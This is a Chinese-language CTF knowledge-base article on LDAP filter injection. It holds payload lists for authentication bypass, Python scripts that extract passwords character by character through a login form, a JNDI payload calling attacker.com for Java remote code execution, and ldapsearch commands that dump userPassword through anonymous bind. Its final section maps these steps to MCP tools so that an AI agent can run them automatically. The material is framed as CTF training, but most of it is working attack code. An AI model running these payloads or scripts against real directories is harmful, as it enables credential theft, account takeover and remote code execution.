---
id: "ctf-website/02-auth/ldap-injection"
title: "LDAP Injection"
title_en: "LDAP Injection"
summary: >
  介绍 LDAP 过滤器注入的攻击原理，包括认证绕过、盲注逐字符提取属性值、LDAP-to-JNDI 反序列化链及 OpenLDAP 匿名绑定攻击。覆盖完整的 LDAP filter 注入 payload 字典和盲注脚本。
summary_en: >
  A guide to LDAP filter injection attacks covering authentication bypass, blind character-by-character attribute extraction, LDAP-to-JNDI deserialization chains, and OpenLDAP anonymous bind exploitation. Includes complete LDAP filter injection payloads and blind extraction scripts.
board: "ctf-website"
category: "02-auth"
signals: ["LDAP", "过滤器注入", "LDAP injection", "JNDI", "盲注", "anonymous bind", "OpenLDAP"]
mcp_tools: ["http_probe", "kb_router", "kb_read_file", "run_ctf_tool"]
keywords: ["LDAP injection", "LDAP注入", "JNDI", "filter bypass", "盲注", "anonymous bind", "认证绕过"]
difficulty: "advanced"
tags: ["authentication", "ldap", "injection", "jndi", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/02-auth/oauth-sso", "ctf-website/16-rate-limit/02-brute-force-tactics", "ctf-website/24-database/04-config-exposure", "ctf-website/13-signature/00-overview", "ctf-website/14-idor/02-bac-business-logic"]
---

# LDAP Injection

## 0. 目录字段到身份/权限路线图

LDAP 注入的目标不是只让登录成功，而是把目录字段转成身份、组、凭据和后台权限。CTF 里最短路径通常是：判断 filter 形态 → 扩展 OR/通配 → 抽 `mail/memberOf/userPassword/description` → 回到 Web 登录、SSO、后台或 API token。

| 目录信号 | 关键属性 | 第一动作 | 下一跳 |
|---|---|---|---|
| 登录 filter | `uid`, `mail`, `sAMAccountName` | 闭合值、扩展 OR 分支 | Auth bypass |
| 组/角色 | `memberOf`, `gidNumber`, `role`, `description` | 枚举 admin/ops/dev 组 | BAC、后台入口 |
| 凭据 | `userPassword`, `unicodePwd`, `pwdLastSet` | 前缀盲注或匿名 bind | 凭据复用、限速绕过 |
| SSO 绑定 | `mail`, `eduPersonPrincipalName`, `sub` | 邮箱/NameID 错绑 | OAuth/SAML |
| 配置/服务 | `labeledURI`, `host`, `sshPublicKey` | 找内部 URL 和 key | SSRF、配置泄露 |
| Flag/业务字段 | `info`, `description`, 自定义属性 | 属性存在/前缀抽取 | CTF 目标字段 |

目录字段路由器：

```python
# ldap_attribute_router.py
import csv
import re
from pathlib import Path

ROUTES = {
    "identity": re.compile(r"uid|cn|mail|sAMAccountName|userPrincipalName|eduPerson", re.I),
    "group": re.compile(r"memberOf|gidNumber|group|role|admin|ops|dev", re.I),
    "credential": re.compile(r"userPassword|unicodePwd|pwdLastSet|shadow|sshPublicKey", re.I),
    "service": re.compile(r"labeledURI|host|url|endpoint|database|ldap", re.I),
    "flag": re.compile(r"flag\{|CTF\{|DASCTF\{|description|info", re.I),
}

def route_ldif(path, out="exports/ldap_attribute_routes.csv"):
    rows = []
    current_dn = ""
    for line in open(path, encoding="utf-8", errors="ignore"):
        line = line.rstrip("\n")
        if line.startswith("dn: "):
            current_dn = line[4:]
        if ":" not in line:
            continue
        attr, value = line.split(":", 1)
        text = f"{attr} {value}"
        hits = [name for name, rx in ROUTES.items() if rx.search(text)]
        if hits:
            rows.append({"dn": current_dn, "attribute": attr, "routes": ",".join(hits), "sample": value.strip()[:160]})
    Path(out).parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["dn", "attribute", "routes", "sample"])
        w.writeheader()
        w.writerows(rows)
    return rows
```

执行节奏：

1. 先用错误和结果数判断 filter 形态，不要盲目套万能 payload。
2. 登录口命中后，马上测搜索/通讯录/SSO 绑定口，找更稳定的结果 oracle。
3. 抽到 `mail/memberOf` 后转 OAuth/SAML/后台角色链；抽到 `userPassword` 后转凭据喷射/限速文档。
4. 抽到 `labeledURI/host` 后转 SSRF 或配置泄露；抽到 `description/info` 先查 flag/业务 secret。
5. 所有盲注都保留前缀推进日志，避免把随机页面长度误判成目录命中。

## LDAP 过滤器注入

```python
# LDAP filter 语法: (attribute=value)
# 注入点: value 部分未转义 → 攻撃者可修改 filter 逻辑

LDAP_PAYLOADS = [
    # 认证绕过
    # 原始: (&(uid={user})(password={pass}))
    # 注入: uid=*)(|(uid=*  → (&(uid=*)(|(uid=*)(password=xxx))
    # 结果: uid 通配 + OR → 恒真 → 绕过密码
    ("*)(uid=*))(|(uid=*", "Universal bypass"),
    ("admin)(&)", "Specific user"),
    ("*)(|(password=*", "Password wildcard"),

    # 盲注 — 逐字符提取 (类似 SQL 盲注)
    # (&(uid=admin)(password=a*))  → 匹配 → 密码以 a 开头
    ("*)(password={prefix}*", "Blind prefix"),

    # AND/OR 注入
    # (&(uid=admin)(|(department=IT)(department=HR))) → 多部门访问
    ("admin)(|(department=IT", "OR injection"),
]
```

### 1.1 LDAP Filter 语法速查

| 语法 | 含义 | 注入价值 |
|---|---|---|
| `(uid=admin)` | 等值匹配 | 闭合属性值 |
| `(uid=adm*)` | 通配前缀 | 盲注抽取 |
| `(&(a=b)(c=d))` | AND | 加条件/截断后续 |
| `(|(a=b)(c=d))` | OR | 认证绕过 |
| `(!(a=b))` | NOT | 反向判断 |
| `(mail=*)` | 属性存在 | 枚举字段 |
| `(memberOf=cn=admin,...)` | 组成员 | 权限过滤 |

特殊字符转义：

```text
*  -> \2a
(  -> \28
)  -> \29
\  -> \5c
NUL -> \00
```

如果输入 `*` 后结果变多，说明通配符未转义；输入 `)` 后 filter 报错，说明可闭合表达式；输入 `\2a` 后按星号匹配，说明服务端可能二次 decode。

### 1.2 常见认证 Filter 形态

| 原始 Filter | 用户名 payload | 效果 |
|---|---|---|
| `(&(uid={u})(password={p}))` | `*)(uid=*))(|(uid=*` | OR 恒真 |
| `(&(mail={u})(userPassword={p}))` | `admin@example.com)(` | 截断/报错定位 |
| `(&(objectClass=user)(sAMAccountName={u}))` | `*)(memberOf=CN=Admins,*` | AD 组过滤 |
| `(|(uid={u})(mail={u}))` | `*)(userPassword=*)` | 扩展 OR 分支 |
| `(cn={q}*)` | `*)(|(cn=admin*)` | 搜索结果扩展 |

命中样本：登录成功、搜索结果数量增加、错误包含 `Bad search filter`、响应时间随前缀匹配变化。

## LDAP 盲注脚本

```python
# ldap_blind.py — 逐字符提取 LDAP 属性
import requests, string

def ldap_blind_extract(target: str, attribute: str = "password"):
    """通过 LDAP filter 盲注提取属性值"""
    charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    extracted = ""

    while True:
        for ch in charset:
            test = extracted + ch
            # 构造盲注 filter
            # 原始: (&(uid=admin)(password={test}*))
            payload = f"*)({attribute}={test}*"
            r = requests.post(f"{target}/login", data={
                "username": payload,
                "password": "anything"
            })
            # 如果登录成功 → 匹配前缀
            if "Welcome" in r.text or r.status_code == 200:
                extracted = test
                print(f"[+] {attribute} = {extracted}")
                break
        else:
            break  # 没有更多字符
    return extracted
```

### 2.1 稳定盲注判定

```python
import string
import requests

ALPHABET = string.ascii_letters + string.digits + "_-@.{}:$!#"

def oracle(resp):
    text = resp.text.lower()
    if "welcome" in text or "logout" in text or resp.status_code in (302, 303):
        return True
    if "invalid" in text or "not found" in text or "bad search filter" in text:
        return False
    return len(resp.text) > 1000

def ldap_prefix_extract(url, attr="mail", base_user="admin", max_len=64):
    prefix = ""
    for _ in range(max_len):
        for ch in ALPHABET:
            payload = f"{base_user})({attr}={prefix + ch}*"
            r = requests.post(url, data={"username": payload, "password": "x"}, timeout=8)
            if oracle(r):
                prefix += ch
                print(prefix)
                break
        else:
            return prefix
    return prefix
```

如果 response oracle 不稳定，改用搜索页结果数量、分页总数、是否出现特定用户名，或者让 filter 在 True 分支匹配 `uid=admin`、False 分支匹配不存在用户。

## LDAP → JNDI 反序列化 (Java)

```python
# 如果 LDAP 注入点传给 Java 的 InitialDirContext:
# 可以返回指向恶意 LDAP 服务器的引用 → JNDI 反序列化 → RCE

# 前提:
# 1. com.sun.jndi.ldap.object.trustURLCodebase = true (Java 8u191 前默认)
# 2. 或利用本地 gadget 链 (更高版本)

# 恶意 LDAP 服务器 (marshalsec)
# java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
#   http://attacker.com/#Exploit 1389

# 注入 payload:
# ${jndi:ldap://attacker.com:1389/Exploit}
```

## OpenLDAP 特定攻击

```bash
# Anonymous bind — 匿名绑定读所有条目
ldapsearch -x -H ldap://ldap.target.com -b "dc=target,dc=com" "(objectClass=*)"

# 如果无密码策略 → 读所有用户和属性
ldapsearch -x -H ldap://ldap.target.com -b "dc=target,dc=com" \
  "(&(objectClass=person)(uid=*))" uid userPassword mail
```

### Active Directory / OpenLDAP 属性字典

| 目标 | AD 属性 | OpenLDAP 属性 |
|---|---|---|
| 用户名 | `sAMAccountName`, `userPrincipalName` | `uid`, `cn` |
| 邮箱 | `mail` | `mail` |
| 组 | `memberOf` | `memberOf`, `gidNumber` |
| 密码哈希 | `unicodePwd` 不可读，`pwdLastSet` | `userPassword` |
| 状态 | `userAccountControl` | `shadowExpire`, `pwdAccountLockedTime` |
| 描述 | `description`, `info` | `description` |

高价值查询：

```bash
ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(|(uid=admin)(cn=admin)(sAMAccountName=admin))"
ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(|(memberOf=*admin*)(description=*flag*))"
ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(userPassword=*)" uid userPassword
```

CTF 常见 flag 位置：`description`、`info`、`mail`、自定义属性、组名、OU 名称、`userPassword` 明文/弱 hash。

## 攻击链

```
LDAP injection → 认证绕过 → 后台 → RCE
LDAP blind → 提取 userPassword → crack → 凭据重用
LDAP → JNDI reference → 反序列化 → Java RCE
OpenLDAP anonymous bind → 全量数据导出 → 账号枚举 → 密码喷射
LDAP filter injection → (&(uid=*)(memberOf=cn=admin,ou=groups)) → 提权
```

## Evidence

记录: 原始 filter 形态推断、payload、响应差异、搜索结果数量、盲注字符日志、提取出的属性值、LDAP banner/base DN、JNDI 外连日志、`ldap_attribute_routes.csv` 字段路由、成功样本和失败样本。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| LDAP 注入端点探测 | `http_probe` | HTTP GET 探测 LDAP 查询端点 |
| 按信号路由 | `kb_router` | 命中 OAuth、BAC、配置、限速信号后跳转文档 |
| 读取技术文件 | `kb_read_file` | 读取 LDAP、SSO、限速、配置链路细节 |
| 执行脚本 | `run_ctf_tool` | 跑 LDAP 前缀抽取、LDIF 字段路由、结果数 oracle |
